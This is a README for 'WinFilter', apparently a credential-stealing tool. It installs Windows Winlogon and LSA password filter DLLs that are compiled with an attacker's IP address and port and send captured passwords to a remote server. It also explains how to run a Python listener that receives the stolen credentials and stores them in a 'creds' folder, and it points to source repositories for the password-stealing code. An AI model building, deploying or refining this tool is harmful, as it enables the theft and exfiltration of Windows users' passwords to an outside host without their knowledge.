# WinFilter
Winlogon and LSA Notification Password Filters 

## Reference
The primary code for each of the filters were pulled from:
- https://github.com/gtworek/PSBits/tree/master/PasswordStealing
- https://github.com/3gstudent/PasswordFilter

## Usage
### Filters
For each of the DLLs, they must be compiled with the desired IP address and port at the top of the file using Visual Studio.

`#define SERVER_IP`

`#define PORT`

Modify and utilize each of the install scripts in order to set up the filters. 

`sed -i 's/kindtime/your_name/g' install_script`

### Credentials Receiver
To receive creds and set up the server, run:

`python3 winfilter.py`

By default, the IP will be '0.0.0.0' and the port will be '80'. You can give a specific ip or port using `--ip <ip_addr>` or `--port <port_num>`.

Screenshot Example:
```python3 winfilter.py --port 6006```

![photo](photos/photo.png)

Credentials will also be written to a file in the `creds` directory. Use the `--clean` option to clear out the directory.